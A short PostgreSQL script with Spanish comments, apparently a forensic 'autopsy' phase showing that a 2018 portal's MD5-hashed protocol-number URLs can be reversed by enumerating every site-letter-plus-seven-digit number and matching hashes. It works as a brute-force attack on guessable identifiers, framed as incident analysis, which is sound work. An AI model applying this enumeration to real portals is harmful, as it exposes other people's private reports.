-- Fase 23 · autopsia: el MD5 del número de protocolo del portal de 2018 se revierte en segundos.
-- El atacante conoce la forma del número (letra de sede, guion, siete dígitos) porque la ve en su propio informe.
-- Prueba cada número de cada sede hasta su máximo, calcula el MD5 y lo cruza con las URL del portal.
\timing on
DROP TABLE IF EXISTS staging.f23_candidatos;
CREATE TABLE staging.f23_candidatos AS
SELECT md5(v.p || '-' || lpad(n::text, 7, '0')) AS h, v.p || '-' || lpad(n::text, 7, '0') AS numero
FROM (VALUES ('A', 166039), ('C', 597929), ('E', 80658), ('J', 152133), ('R', 160672), ('V', 144602)) AS v(p, mx),
     generate_series(1, v.mx) AS n;
SELECT count(*) AS candidatos_probados FROM staging.f23_candidatos;
SELECT count(*) AS urls_del_portal_con_sede,
       count(c.h) AS urls_revertidas
FROM staging.portal_2018 p LEFT JOIN staging.f23_candidatos c ON c.h = p.url_hash
WHERE p.visible_number ~ '^[A-Z]-';
DROP TABLE staging.f23_candidatos;
